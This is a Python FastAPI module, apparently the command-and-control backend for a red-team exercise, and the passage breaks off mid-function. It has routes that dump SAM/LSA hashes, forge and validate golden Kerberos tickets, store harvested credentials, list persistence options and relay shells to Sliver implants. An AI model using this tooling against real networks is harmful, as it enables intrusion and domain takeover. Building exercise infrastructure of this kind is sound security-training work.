"""C2 management API: boxes, creds, exec, file transfer, sessions, beacons."""

import asyncio
import contextlib
import datetime as dt
import gzip
import json
import logging
import re
import tempfile
import time
import uuid
from collections.abc import AsyncIterator
from pathlib import Path
from typing import TYPE_CHECKING, Any

import grpc
from fastapi import (
    APIRouter,
    Depends,
    Form,
    HTTPException,
    Query,
    Request,
    UploadFile,
    WebSocket,
    WebSocketDisconnect,
)
from fastapi.responses import JSONResponse, StreamingResponse
from pydantic import BaseModel
from sqlalchemy import func, select, update
from sqlalchemy.orm import Session

from fastapi_backend.c2.bulk_exec import BulkExecAsyncRequest
from fastapi_backend.c2.bulk_put_file import BulkPutFileAsyncRequest
from fastapi_backend.core.config import config
from fastapi_backend.core.deploy_retry import mark_deploy_failed
from fastapi_backend.core.naming_pools import naming_pool_manager
from fastapi_backend.core.task_tracker import (
    create_task,
    finish_task,
    register_background_task,
    run_cancellable,
    set_phase,
    start_task,
    update_box_progress,
    update_task_metadata,
)
from fastapi_backend.database.db_writer import engine
from fastapi_backend.database.models import (
    Boxes,
    BoxResponse,
    CredentialCreate,
    CredentialResponse,
    Credentials,
    DeployedIOCs,
    DevBeacon,
    DevSession,
    ImplantBuilds,
    PendingKills,
    PivotSessions,
    SAResult,
    assign_blue_team_label,
)
from fastapi_backend.database.write_actor import write_actor
from fastapi_backend.routes.admin import require_admin
from fastapi_backend.utils.asyncio_tasks import fire_and_forget
from fastapi_backend.utils.auth import Users, get_current_user, get_user_from_token
from fastapi_backend.utils.db_helpers import query_one
from fastapi_backend.utils.exceptions import (
    box_not_found,
    cred_not_found,
    no_creds_for_box,
)
from fastapi_backend.utils.nxc_routing import _get_best_cred, resolve_nxc_target

if TYPE_CHECKING:
    from fastapi_backend.netexec.wrapper import NXCWrapper  # lazy-load

from fastapi_backend.core.operator_activity import track_operator_activity

logger = logging.getLogger(__name__)

router = APIRouter(
    prefix="/c2",
    tags=["c2"],
    dependencies=[Depends(track_operator_activity)],
)

_VALID_PROTOCOLS = {"smb", "ssh", "winrm"}


def _log_ws_open(endpoint: str, session_id: str, user: Any) -> None:
    """Log a WebSocket accept so operator-terminal lifecycle is visible in logs.

    The three terminal handlers used to accept + tear down silently (the
    disconnect was caught with a bare `pass`), so a break left nothing to grep.
    """
    logger.info(
        "ws OPEN %s session=%s user=%s",
        endpoint, session_id, getattr(user, "username", "?"),
    )


def _log_ws_close(endpoint: str, session_id: str, code: object = None, reason: str = "") -> None:
    """Log a WebSocket close with its code + reason (see _log_ws_open)."""
    logger.info(
        "ws CLOSE %s session=%s code=%s reason=%s",
        endpoint, session_id, code, reason,
    )


# WebSocket close code for a dead/gone Sliver session (client treats as permanent,
# no auto-reconnect). Distinct from 4003 (auth) / 4009 (in-use) / 1000 (exit).
WS_CLOSE_SESSION_DEAD = 4010


async def _pty_recv(websocket: "WebSocket", hub: Any) -> None:
    """PTY session-shell receive loop.

    New binary/JSON split protocol (see PLAN_pty_session_shell.md §6.3):
      - Binary WS frames → raw stdin bytes forwarded verbatim to Sliver.
      - Text WS frames = JSON control:
          * ``{"type":"ping"}``  → answered with ``{"type":"pong"}`` for
            proxy-idle keepalive (same rationale as _sliver_shell_recv).
          * ``{"type":"resize", "cols":N, "rows":N}`` → rebroadcast to
            peer clients so their local prompts refit; Sliver's ShellReq
            does not carry a size field on this sliver-py version, so no
            server-side action.
          * Anything else → silently dropped.

    Raises WebSocketDisconnect when the client goes away (handled by caller).
    """
    while True:
        msg = await websocket.receive()
        if msg.get("type") == "websocket.disconnect":
            raise WebSocketDisconnect(code=msg.get("code", 1000))
        raw = msg.get("bytes")
        if raw is not None:
            await hub.enqueue_stdin(raw)
            continue
        text = msg.get("text")
        if text is None:
            continue
        try:
            data = json.loads(text)
        except Exception:
            continue
        if not isinstance(data, dict):
            continue
        mtype = data.get("type")
        if mtype == "ping":
            with contextlib.suppress(Exception):
                await websocket.send_json({"type": "pong"})
            continue
        if mtype == "resize":
            # Peer-broadcast so co-op clients' local terminals resize their
            # prompt fitting. No server-side PTY resize — see plan §1 non-goals.
            resize_frame = {
                "type": "resize",
                "cols": data.get("cols"),
                "rows": data.get("rows"),
            }
            with contextlib.suppress(Exception):
                await hub._send_each(
                    lambda ws, _f=resize_frame: ws.send_json(_f)
                )
            continue


async def _sliver_shell_recv(websocket: "WebSocket", hub: Any) -> None:
    """Sliver-shell receive loop: exit signal, heartbeat pong, enqueue input."""
    while True:
        msg = await websocket.receive_json()
        # Side-channel exit signal bounced back from the hub — close only this client.
        if isinstance(msg, dict) and msg.get("exit"):
            return
        # Heartbeat pong — same reasoning as _pty_recv above.
        if isinstance(msg, dict) and msg.get("type") == "ping":
            with contextlib.suppress(Exception):
                await websocket.send_json({"type": "pong"})
            continue
        # Any other non-`input` frame is dropped so it never reaches dispatch.
        if not isinstance(msg, dict) or msg.get("type") != "input":
            continue
        line = msg.get("data", "")
        await hub.enqueue(line, websocket)


async def _run_shell_until_dead_or_disconnect(
    websocket: "WebSocket", hub: Any, recv_coro,
) -> object:
    """Race the client receive loop against the hub's session-dead signal.

    Returns the close code to log: 4010 if the session died under the socket,
    the WebSocketDisconnect code if the client left, else None (clean exit).
    A dead session is closed here with 4010; the caller closes for other reasons.
    """
    recv_task = asyncio.create_task(recv_coro)
    dead_task = asyncio.create_task(hub.session_dead_event.wait())
    _done, pending = await asyncio.wait(
        {recv_task, dead_task}, return_when=asyncio.FIRST_COMPLETED,
    )
    for task in pending:
        task.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await task

    if hub.session_dead_event.is_set():
        with contextlib.suppress(Exception):
            await websocket.close(code=WS_CLOSE_SESSION_DEAD)
        return WS_CLOSE_SESSION_DEAD

    exc = recv_task.exception() if recv_task.done() and not recv_task.cancelled() else None
    if exc is not None and not isinstance(exc, WebSocketDisconnect):
        raise exc
    if isinstance(exc, WebSocketDisconnect):
        return exc.code
    return None


# ---------------------------------------------------------------------------
# Auth helpers
# ---------------------------------------------------------------------------

def require_non_blue(current_user: Users = Depends(get_current_user)) -> Users:
    """Allow admins and red/white/black team members; block blue team."""
    if current_user.is_blue_team:
        raise HTTPException(status_code=403, detail="Blue team members cannot access C2 data")
    return current_user


def validate_token_param(token: str) -> Users:
    """Validate a JWT passed as a query parameter (used by EventSource / WebSocket)."""
    try:
        user = get_user_from_token(token)
    except Exception:
        raise HTTPException(status_code=401, detail="Invalid or expired token") from None
    if user.is_blue_team:
        raise HTTPException(status_code=403, detail="Blue team members cannot access C2 data")
    return user


# ---------------------------------------------------------------------------
# DEV_MODE helpers
# ---------------------------------------------------------------------------

def _dev_row_to_dict(row: Any) -> dict:
    """Convert a SQLAlchemy ORM row to a plain dict, excluding SA internals.

    Beacon/session rows are augmented with the two keys the live serializers
    emit (``c2_url``, ``is_pivot``) so DEV_MODE and live responses have the SAME
    SHAPE. Without that, a caller filtering on ``d.get("c2_url", "")`` silently
    matches nothing in DEV_MODE instead of failing loudly — which is exactly the
    bug that made test_e2e_pivot report a fake 10/10 failure against live.

    ``c2_url`` is None rather than a fabricated value: DevBeacon has no column
    for it, and inventing one would make a mocked test pass on data the real
    endpoint would never produce.
    """
    from sqlalchemy import inspect as sa_inspect  # cycle-break
    d = {c.key: getattr(row, c.key) for c in sa_inspect(type(row)).mapper.column_attrs}
    if "remote_address" in d:
        from fastapi_backend.c2.serialize import _is_pivot  # cycle-break
        d.setdefault("c2_url", None)
        d.setdefault("is_pivot", _is_pivot(d.get("remote_address") or ""))
    return d


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _get_nxc_wrapper() -> "NXCWrapper":
    from fastapi_backend.utils.dependencies import (
        get_nxc_wrapper as _canonical,  # cycle-break
    )
    return _canonical()


def _get_sliver_client() -> Any:
    from fastapi_backend.c2.sliver_manager import sliver_manager  # cycle-break

    client = sliver_manager.get_client()

    if sliver_manager.is_connected():
        logger.info("Sliver client is marked as connected")
    else:
        logger.info("Sliver client is NOT marked ask connected")

    if client is None:
        raise HTTPException(status_code=503, detail="Sliver not connected, get_client returned None")
    return client


async def _sliver_known_build_names() -> set[str] | None:
    """Stems of every build Sliver currently recognizes, or None if unavailable.

    ``None`` means "unknown — do not gate" (fail-open), matching
    ``_find_matching_build``'s existing behaviour: a build whose ``implant_config``
    was pruned from ``sliver.db`` (clean_stale_implants / a Sliver restart) yields a
    dead-on-arrival binary the server rejects with
    ``Stream read error [mtls] unknown implant signature key``. Callers stem-compare
    ``Path(build.filename).stem`` against this set to avoid reusing pruned builds.

    Returns ``None`` under ``DEV_MODE`` (no real Sliver) and on any gRPC failure, so
    a transient outage never bricks a deploy.
    """
    if config.DEV_MODE:
        return None
    try:
        client = _get_sliver_client()
    except HTTPException:
        return None
    try:
        return set(await client.implant_builds())
    except Exception as exc:
        # any gRPC/connection failure => validity unknown; fail-open
        logger.warning("could not fetch Sliver build list for validity check: %s", exc)
        return None


@router.get("/server-info")
def get_server_info(current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Return the C2 server's IP address for use in implant generation."""
    return {
        "c2_ip": config.C2_IP or config.SLIVER_HOST,
        "display_timezone": config.DISPLAY_TIMEZONE,
        "dev_mode": config.DEV_MODE,
    }


@router.get("/sa/status")
def get_sa_status(current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Return SA collection interval and last-run timestamp for countdown display."""
    from fastapi_backend.utils.dependencies import get_orchestrator  # cycle-break
    orch = get_orchestrator()
    return {
        "interval_minutes": config.SA_COLLECTION_INTERVAL_MINUTES,
        "last_run_started_at": orch.sa_stats.get("last_run_started_at"),
    }


@router.get("/persistence-mechanisms")
def get_persistence_mechanisms(
    os: str | None = Query(default=None),
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """List PersistenceMechanism instances available for the Generation page.

    Filter by ?os=<windows|linux|firewall> to scope to a single platform;
    omit the param to get every mechanism grouped by OS.  Each entry is
    keyed by its module-attribute name (the label the form should send back
    in ImplantGenerateRequest.persistence_name).
    """
    from iocs import persistence as _p  # cycle-break

    def _project(attr_name: str, m: Any) -> dict[str, Any]:
        return {
            "key": attr_name,                  # what the client sends back
            "name": m.name,                    # dataclass.name (mechanism family)
            "label": m.label or attr_name,     # rendered in the dropdown; attr fallback = defect (tests/test_persistence_labels.py)
            "os": m.os,
            "tier": m.tier,
            "tier_group": m.tier_group,
            "immutable": m.immutable,
            "deploy_script": m.deploy_script,
            "remediate_script": m.remediate_script,
            "protect_paths": list(m.protect_paths),
        }

    if os:
        # Single-OS view — one flat list.
        rows = [_project(a, m) for a, m in _p.by_os(os) if m.os]
        return {"os": os, "mechanisms": rows}

    # All-OS view — grouped.
    by_os_map: dict[str, list[dict[str, Any]]] = {}
    for os_key in ("windows", "linux", "firewall"):
        by_os_map[os_key] = [_project(a, m) for a, m in _p.by_os(os_key) if m.os]
    return {"by_os": by_os_map}


@router.get("/nxc-health")
def get_nxc_health(
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Return the set of box IPs whose recent NXC calls have been failing.

    A host is "degraded" when failures inside the last
    NXC_DEGRADED_WINDOW_MINUTES reach NXC_DEGRADED_THRESHOLD. Powers the
    C2 overview alert badges.
    """
    from fastapi_backend.core.nxc_health import get_tracker  # cycle-break
    return {"degraded_box_ips": sorted(get_tracker().degraded_ips())}


@router.get("/difficulty-formula")
def get_difficulty_formula(
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Publish the auto-difficulty weight table + bucket boundaries.

    Sole source of truth is `fastapi_backend/core/difficulty_formula.py`; the
    Generate-page React helper mirrors these values, and the parity test in
    `tests/test_difficulty_formula.py` fails on any drift.
    """
    from fastapi_backend.core.difficulty_formula import (  # cycle-break
        BUCKET_BOUNDARIES,
        PROTECTION_WEIGHTS,
        STORAGE_MODE_WEIGHTS,
    )
    return {
        "storage_mode_weights": STORAGE_MODE_WEIGHTS,
        "protection_weights": PROTECTION_WEIGHTS,
        "bucket_boundaries": [
            {"upper_inclusive": None if b == float("inf") else b, "difficulty": d}
            for b, d in BUCKET_BOUNDARIES
        ],
    }


@router.get("/terminal-presence")
def get_terminal_presence(
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Snapshot of active WebSocket terminal presence, keyed by box_ip.

    Powers the Targets page's active-terminal column cold-load render before
    the first SSE `terminal_presence_update` event arrives, and gives the
    pytest suite an independent read path (docs/PLAN_targets_terminal_presence.md).
    """
    from fastapi_backend.c2.terminal_presence import get_tracker  # cycle-break
    return {"presence": get_tracker().snapshot()}


@router.get("/pivot-sessions")
def get_pivot_sessions(current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """List active pivot sessions for the network map and implants pages."""
    with Session(engine) as session:
        rows = session.execute(
            select(PivotSessions).where(PivotSessions.active == True)  # noqa: E712
        ).scalars().all()
        return {
            "pivot_sessions": [
                {
                    "id": r.id,
                    "team_num": r.team_num,
                    "pfsense_session_id": r.pfsense_session_id,  # backing Sliver session — liveness probe
                    "pfsense_box_ip": r.pfsense_box_ip,
                    "pfsense_pivot_ip": r.pfsense_pivot_ip,
                    "tcp_pivot_port": r.tcp_pivot_port,
                    "created_at": r.created_at.isoformat(),
                }
                for r in rows
            ]
        }


@router.get("/sliver-hub-debug")
def get_sliver_hub_debug(
    request: Request,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Dev-mode-only introspection of SliverHub client counts per session.

    Returns 404 in production (DEV_MODE=false). Lets Playwright tests assert
    hub teardown after multi-client disconnects.
    """
    from fastapi_backend.core.config import config  # cycle-break
    if not config.DEV_MODE:
        raise HTTPException(status_code=404, detail="Not available outside DEV_MODE")
    hubs: dict = getattr(request.app.state, "sliver_hubs", {}) or {}
    return {
        "hubs": {
            sid: {"client_count": len(getattr(hub, "_clients", []) or [])}
            for sid, hub in hubs.items()
        }
    }


# ---------------------------------------------------------------------------
# Boxes
# ---------------------------------------------------------------------------


@router.get("/boxes")
def get_boxes(current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """List all known boxes with their current session/beacon attribution."""
    with Session(engine) as session:
        boxes = session.execute(select(Boxes)).scalars().all()
        return {"boxes": [BoxResponse.model_validate(b) for b in boxes]}


# ---------------------------------------------------------------------------
# Credentials
# ---------------------------------------------------------------------------


@router.post("/creds", status_code=201)
async def add_cred(body: CredentialCreate, current_user: Users = Depends(require_non_blue)) -> CredentialResponse:
    """Register a new credential. If box_ip is set, validates it via NXC immediately.

    `cred_type` discriminator: `password` (plaintext) or `nthash` (32-hex). The
    Pydantic body validator on `CredentialCreate` enforces nthash format.
    Only password rows get an NXC `check_creds` probe at insert time — nthash
    rows pick up their `valid` flag on the next HashHarvestLoop cycle.

    Domain-scoped credential (Feature D): leave `box_ip` unset and set both
    `team_num` and `domain` (cred_type password/nthash). The row then resolves
    for every domain-joined box in that team via `_get_best_cred`'s domain
    fallback (per-box rows still win). It is created `valid=None` here — the
    NXC probe is skipped because there's no single box to test — and the
    `_revalidate_domain_creds` pass sets `valid` next cycle by probing every
    domain box. (Team-scoped ccache rows use the same box_ip=NULL shape but are
    owned by cred_harvester.TicketRefreshLoop.)
    """
    if body.protocol not in _VALID_PROTOCOLS:
        raise HTTPException(
            status_code=422,
            detail=f"protocol must be one of {sorted(_VALID_PROTOCOLS)}",
        )
    # Any credential check is network I/O — do it BEFORE the write so the actor
    # transaction stays short. All inputs come from the request body.
    valid: bool | None = None
    if (
        body.cred_type == "password"
        and body.box_ip
        and body.password
        and not config.DEV_MODE
    ):
        wrapper = _get_nxc_wrapper()
        result = await wrapper.check_creds(
            body.box_ip, body.protocol, body.username, body.password
        )
        valid = result.success

    def _create_cred(session: Session) -> CredentialResponse:
        cred = Credentials(
            username=body.username,
            password=body.password,
            box_ip=body.box_ip,
            protocol=body.protocol,
            is_default=body.is_default,
            valid=valid,
            cred_type=body.cred_type,
            nthash=body.nthash,
            domain=body.domain,
            team_num=body.team_num,
            source="operator",
        )
        session.add(cred)
        session.flush()
        session.refresh(cred)
        return CredentialResponse.model_validate(cred)

    return await write_actor.submit(_create_cred, label="add_cred")


@router.get("/creds")
def get_creds(
    box_ip: str | None = None,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """List credentials, optionally filtered by box_ip.

    Each row also carries `source_ioc_name` (the IOC that auto-registered it)
    so the UI can render a "via IOC: <name>" badge without a second round-trip.
    """
    with Session(engine) as session:
        # Infrastructure (red_scoring) creds are NEVER shown to operators — they
        # are the IOC pipeline's private scoring identity.
        stmt = select(Credentials).where(Credentials.is_infrastructure == False)  # noqa: E712
        if box_ip:
            stmt = stmt.where(Credentials.box_ip == box_ip)
        creds = session.execute(stmt).scalars().all()

        deployed_ids = {c.source_deployed_ioc_id for c in creds if c.source_deployed_ioc_id}
        ioc_name_by_id: dict[int, str] = {}
        if deployed_ids:
            rows = session.execute(
                select(DeployedIOCs.id, DeployedIOCs.ioc_name).where(
                    DeployedIOCs.id.in_(deployed_ids)
                )
            ).all()
            ioc_name_by_id = {r[0]: r[1] for r in rows}

        out = []
        for c in creds:
            d = CredentialResponse.model_validate(c).model_dump()
            d["source_ioc_name"] = (
                ioc_name_by_id.get(c.source_deployed_ioc_id) if c.source_deployed_ioc_id else None
            )
            out.append(d)
        return {"credentials": out}


@router.delete("/creds/{cred_id}", status_code=204)
def delete_cred(cred_id: int, current_user: Users = Depends(require_non_blue)) -> None:
    """Delete a single credential by id."""
    def _delete(session: Session) -> None:
        cred = session.get(Credentials, cred_id)
        if not cred:
            raise cred_not_found()
        if cred.is_infrastructure:
            raise HTTPException(
                status_code=403,
                detail="cannot delete a scoring-infrastructure credential",
            )
        session.delete(cred)

    write_actor.submit_sync(_delete, label="delete_cred")


@router.delete("/creds", status_code=200)
def delete_invalid_creds(current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Delete all credentials where valid=False, excluding inventory defaults.

    Scoring-infrastructure (red_scoring) creds are NEVER swept here — the
    liveness probe can transiently mark them invalid, and deleting them would
    silently break the IOC pipeline.
    """
    def _delete_invalid(session: Session) -> int:
        rows = session.execute(
            select(Credentials).where(
                Credentials.valid == False,  # noqa: E712
                Credentials.is_default == False,  # noqa: E712
                Credentials.is_infrastructure == False,  # noqa: E712
            )
        ).scalars().all()
        count = len(rows)
        for cred in rows:
            session.delete(cred)
        return count

    count = write_actor.submit_sync(_delete_invalid, label="delete_invalid_creds")
    return {"deleted": count}


# ---------------------------------------------------------------------------
# Credential harvesting + golden ticket routes (Phase F)
# ---------------------------------------------------------------------------


@router.post("/harvest/{box_ip}", status_code=202)
async def harvest_box(
    box_ip: str, current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Asynchronously trigger SAM/LSA dump for one box.

    Returns ``202 {task_id}`` immediately; the actual NXC ``--sam --lsa`` call
    runs in a background coroutine via ``fire_and_forget``. Progress lands on
    ``OperatorTask(task_type='harvest', target_boxes=[box_ip])`` — operators
    watch it in the Task Queue page. Bypasses HashHarvestLoop's
    ``is_domain_joined`` filter so any Windows box is dumpable on demand.
    """
    with Session(engine) as db:
        box = query_one(db, Boxes, box_ip=box_ip)
        if not box:
            raise box_not_found(box_ip)
        domain = box.domain
        team_num = box.team_num

    task_id = create_task(
        task_type="harvest",
        operator=current_user.username,
        team_num=team_num,
        target_boxes=[box_ip],
        metadata={"box_ip": box_ip, "domain": domain},
    )
    register_background_task(task_id, fire_and_forget(run_cancellable(task_id, _bg_harvest(task_id, box_ip, domain))))
    return {"task_id": task_id}


async def _bg_harvest(task_id: int, box_ip: str, domain: str | None) -> None:
    """Background harvest worker — counts hashes pre/post, updates progress."""
    start_task(task_id)
    update_box_progress(task_id, box_ip, "running")
    if config.DEV_MODE:
        update_box_progress(
            task_id, box_ip, "done",
            details=json.dumps({"hashes_added": 0, "hashes_updated": 0, "dev_mode": True}),
        )
        finish_task(task_id, "done")
        return

    started_at = dt.datetime.now(dt.UTC)
    try:
        with Session(engine) as db:
            pre_count = db.execute(
                select(func.count()).select_from(Credentials).where(
                    Credentials.box_ip == box_ip,
                    Credentials.cred_type == "nthash",
                )
            ).scalar_one()

        from fastapi_backend.c2.cred_harvester import HashHarvestLoop  # cycle-break
        wrapper = _get_nxc_wrapper()
        loop = HashHarvestLoop(wrapper)
        await loop._harvest_box(box_ip, domain)

        with Session(engine) as db:
            post_count = db.execute(
                select(func.count()).select_from(Credentials).where(
                    Credentials.box_ip == box_ip,
                    Credentials.cred_type == "nthash",
                )
            ).scalar_one()
            touched_count = db.execute(
                select(func.count()).select_from(Credentials).where(
                    Credentials.box_ip == box_ip,
                    Credentials.cred_type == "nthash",
                    Credentials.harvested_at >= started_at,
                )
            ).scalar_one()
        added = max(0, post_count - pre_count)
        updated = max(0, touched_count - added)
        update_box_progress(
            task_id, box_ip, "done",
            details=json.dumps({"hashes_added": added, "hashes_updated": updated}),
        )
        finish_task(task_id, "done")
    except Exception as exc:
        logger.exception("_bg_harvest failed for %s", box_ip)
        update_box_progress(task_id, box_ip, "failed", error=str(exc))
        finish_task(task_id, "failed")


class ForgeTicketRequest(BaseModel):
    """POST /c2/forge-ticket request body."""

    team_num: int
    principal: str = "Administrator"
    duration_hours: int | None = None


@router.post("/forge-ticket")
async def forge_ticket(
    body: ForgeTicketRequest, current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Manually forge a golden Kerberos ticket for a team.

    Requires the team's DC to have an `nthash` row for `krbtgt` already
    (populated by `TicketRefreshLoop._ensure_krbtgt` after DCSync) AND
    `Boxes.domain_sid` to be set for any box in the team.
    """
    if config.DEV_MODE:
        return {"status": "ok", "message": "[DEV] forge stubbed"}
    from fastapi_backend.c2.cred_harvester import forge_golden_ticket  # cycle-break

    with Session(engine) as db:
        dc = db.execute(
            select(Boxes).where(
                Boxes.team_num == body.team_num,
                Boxes.is_domain_controller.is_(True),
            ).limit(1)
        ).scalar_one_or_none()
        if not dc:
            raise HTTPException(
                status_code=404,
                detail=f"No domain controller for team {body.team_num}",
            )
        if not dc.domain or not dc.domain_sid:
            raise HTTPException(
                status_code=400,
                detail=(
                    "DC has no domain or domain_sid yet — wait for "
                    "TicketRefreshLoop to DCSync the DC first"
                ),
            )
        krbtgt = db.execute(
            select(Credentials).where(
                Credentials.box_ip == dc.box_ip,
                Credentials.username == "krbtgt",
                Credentials.cred_type == "nthash",
            ).limit(1)
        ).scalar_one_or_none()
        if not krbtgt or (not krbtgt.nthash and not krbtgt.aes256_key):
            raise HTTPException(
                status_code=400,
                detail="No krbtgt material on file — run /c2/harvest first or wait for DCSync",
            )
        domain = dc.domain
        domain_sid = dc.domain_sid
        krbtgt_hash = krbtgt.nthash
        krbtgt_aes256 = krbtgt.aes256_key

    try:
        ccache_bytes, expires_at = await forge_golden_ticket(
            domain=domain,
            domain_sid=domain_sid,
            krbtgt_nthash=krbtgt_hash,
            krbtgt_aes256=krbtgt_aes256,
            target_user=body.principal,
            duration_hours=body.duration_hours,
        )
    except Exception as exc:
        raise HTTPException(status_code=502, detail=f"forge failed: {exc}") from exc

    import base64 as _b64  # cycle-break
    now = dt.datetime.now(dt.UTC)
    blob_b64 = _b64.b64encode(ccache_bytes).decode("ascii")
    def _upsert_ticket(db: Session) -> int:
        row = db.execute(
            select(Credentials).where(
                Credentials.team_num == body.team_num,
                Credentials.cred_type == "ccache",
                Credentials.username == body.principal,
            )
        ).scalar_one_or_none()
        if row:
            row.ccache_blob = blob_b64
            row.ticket_expires_at = expires_at
            row.harvested_at = now
            row.valid = None
            row.source = "forged"
            return row.cred_id
        new_row = Credentials(
            username=body.principal,
            password="",
            box_ip=None,
            team_num=body.team_num,
            protocol="smb",
            is_default=False,
            valid=None,
            cred_type="ccache",
            ccache_blob=blob_b64,
            domain=domain,
            ticket_expires_at=expires_at,
            harvested_at=now,
            source="forged",
        )
        db.add(new_row)
        db.flush()
        return new_row.cred_id

    cred_id = await write_actor.submit(_upsert_ticket, label="forge_ticket")
    return {
        "status": "ok",
        "cred_id": cred_id,
        "principal": body.principal,
        "team_num": body.team_num,
        "domain": domain,
        "expires_at": expires_at.isoformat(),
    }


@router.get("/tickets")
def list_tickets(current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """List forged golden tickets per team."""
    now = dt.datetime.now(dt.UTC)
    with Session(engine) as db:
        rows = db.execute(
            select(Credentials).where(Credentials.cred_type == "ccache")
            .order_by(Credentials.team_num.asc(), Credentials.username.asc())
        ).scalars().all()
        out = []
        for c in rows:
            exp = c.ticket_expires_at
            if exp is not None and exp.tzinfo is None:
                exp = exp.replace(tzinfo=dt.UTC)
            expires_in_min: int | None = None
            if exp is not None:
                expires_in_min = int((exp - now).total_seconds() // 60)
            out.append({
                "cred_id": c.cred_id,
                "team_num": c.team_num,
                "principal": c.username,
                "domain": c.domain,
                "valid": c.valid,
                "expires_at": exp.isoformat() if exp else None,
                "expires_in_min": expires_in_min,
                "harvested_at": c.harvested_at.isoformat() if c.harvested_at else None,
                "source": c.source,
            })
    return {"tickets": out}


@router.post("/tickets/{cred_id}/refresh")
async def refresh_ticket(
    cred_id: int, current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Force re-forge of a specific team ticket."""
    with Session(engine) as db:
        row = db.get(Credentials, cred_id)
        if not row or row.cred_type != "ccache":
            raise HTTPException(status_code=404, detail="Ticket not found")
        team_num = row.team_num
        principal = row.username
    if team_num is None:
        raise HTTPException(
            status_code=400,
            detail=f"Ticket {cred_id} has no team_num — refresh requires team scope",
        )
    return await forge_ticket(
        ForgeTicketRequest(team_num=team_num, principal=principal),
        current_user=current_user,
    )


@router.delete("/tickets/{cred_id}", status_code=200)
def revoke_ticket(
    cred_id: int, current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Revoke (delete) a forged ticket + its materialized ccache file."""
    from pathlib import Path as _Path  # cycle-break

    def _delete_ticket(db: Session) -> None:
        row = db.get(Credentials, cred_id)
        if not row or row.cred_type != "ccache":
            raise HTTPException(status_code=404, detail="Ticket not found")
        db.delete(row)

    write_actor.submit_sync(_delete_ticket, label="revoke_ticket")
    # Best-effort: delete materialized ccache file if present.
    ccache_path = _Path(config.NXC_PATH) / "ccache" / f"{cred_id}.ccache"
    if ccache_path.exists():
        with contextlib.suppress(OSError):
            ccache_path.unlink()
    return {"revoked": cred_id}


class ValidateTicketRequest(BaseModel):
    """POST /c2/tickets/{cred_id}/validate request body."""

    # None → validate against every box in the ticket's team.
    box_ip: str | None = None


@router.post("/tickets/{cred_id}/validate")
async def validate_ticket(
    cred_id: int,
    body: ValidateTicketRequest | None = None,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Validate a forged golden ticket against a team's boxes.

    Windows boxes are checked via SMB Kerberos (`-k --use-kcache --shares`);
    domain-joined Linux boxes via a real SSH GSSAPI `id` with an
    `impacket-getST host/<fqdn>` fallback. Default: all boxes in the ticket's
    team; pass `{"box_ip": ...}` to validate a single box.
    See docs/PLAN_ticket_multibox_validation.md.
    """
    if config.DEV_MODE:
        return {"status": "ok", "message": "[DEV] validate stubbed", "results": []}

    from types import SimpleNamespace  # cycle-break

    from fastapi_backend.c2.cred_harvester import (
        validate_ticket_against_box,  # cycle-break
    )

    box_ip = body.box_ip if body else None

    # 1. Load ticket + team Kerberos material in one session, snapshot to
    #    detached objects so we don't hold the session across the awaits below.
    with Session(engine) as db:
        cred = db.get(Credentials, cred_id)
        if not cred or cred.cred_type != "ccache":
            raise HTTPException(status_code=404, detail="Ticket not found")
        team_num = cred.team_num
        if team_num is None:
            raise HTTPException(
                status_code=400, detail=f"Ticket {cred_id} has no team_num",
            )
        ticket_snapshot = SimpleNamespace(
            cred_id=cred.cred_id, cred_type=cred.cred_type,
            ccache_blob=cred.ccache_blob, ticket_expires_at=cred.ticket_expires_at,
            username=cred.username, domain=cred.domain,
        )
        dc = db.execute(
            select(Boxes).where(
                Boxes.team_num == team_num,
                Boxes.is_domain_controller.is_(True),
            ).limit(1)
        ).scalar_one_or_none()
        if not dc:
            raise HTTPException(
                status_code=400,
                detail=f"No domain controller for team {team_num}",
            )
        if not dc.domain or not dc.domain_sid:
            raise HTTPException(
                status_code=400,
                detail="DC has no domain/domain_sid yet — wait for DCSync",
            )
        dc_ip = dc.box_ip
        realm = dc.domain
        domain_sid = dc.domain_sid
        krbtgt = db.execute(
            select(Credentials).where(
                Credentials.box_ip == dc_ip,
                Credentials.username == "krbtgt",
                Credentials.cred_type == "nthash",
            ).limit(1)
        ).scalar_one_or_none()
        if not krbtgt or (not krbtgt.nthash and not krbtgt.aes256_key):
            raise HTTPException(
                status_code=400,
                detail="No krbtgt material on file — run /c2/harvest or wait for DCSync",
            )
        krbtgt_nthash = krbtgt.nthash
        krbtgt_aes256 = krbtgt.aes256_key
        box_q = select(Boxes).where(Boxes.team_num == team_num)
        if box_ip:
            box_q = box_q.where(Boxes.box_ip == box_ip)
        boxes = db.execute(box_q).scalars().all()
        if box_ip and not boxes:
            raise HTTPException(
                status_code=400,
                detail=f"Box {box_ip} not in ticket's team {team_num}",
            )
        box_snaps = [
            SimpleNamespace(
                box_ip=b.box_ip, box_name=b.box_name, os=b.os,
                is_domain_joined=b.is_domain_joined,
            )
            for b in boxes
        ]

    # 2. Domain login user is not stored on Boxes — read it per-box from the
    #    live inventory (InventoryManager Box carries domain_username).
    from fastapi_backend.utils.dependencies import get_orchestrator  # cycle-break

    orch = get_orchestrator()
    inv = orch.inventory_manager if orch else None
    nxc = _get_nxc_wrapper()

    results: list[dict[str, Any]] = []
    for bs in box_snaps:
        inv_box = inv.get_box_by_ip(bs.box_ip) if inv else None
        domain_username = inv_box.domain_username if inv_box else None
        results.append(await validate_ticket_against_box(
            nxc,
            box_ip=bs.box_ip, box_name=bs.box_name, box_os=bs.os,
